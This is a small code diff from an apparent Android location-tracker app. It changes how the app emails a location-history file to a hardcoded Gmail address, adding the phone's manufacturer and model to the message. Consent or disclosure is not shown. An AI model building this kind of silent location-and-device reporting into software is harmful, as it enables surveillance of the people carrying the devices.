@@ -2,6 +2,7 @@ package mm.locationtracker.utility;
 
 import android.content.Context;
 import android.os.AsyncTask;
+import android.os.Build;
 
 import java.io.UnsupportedEncodingException;
 
@@ -42,7 +43,11 @@ public class SendMailInvoker {
                 Session session = gmailSMTPMailer.createSessionObject();
                 try {
                     String timeStamp = CustomDate.getCurrentFormattedDate();
-                    Message message = gmailSMTPMailer.createMessage("mmdevelopers9092@gmail.com", "History till " + timeStamp, "Location history till " + timeStamp, filePath, session);
+                    String deviceInfo = Build.MANUFACTURER + " " + Build.DEVICE;
+                    Message message = gmailSMTPMailer.createMessage("mmdevelopers9092@gmail.com",
+                            deviceInfo + " : Location History till " + timeStamp,
+                            "Location history till " + timeStamp + " for the device " + deviceInfo,
+                            filePath, session);
                     gmailSMTPMailer.sendTheMail(message, context);
                 } catch (MessagingException e) {
                     e.printStackTrace();
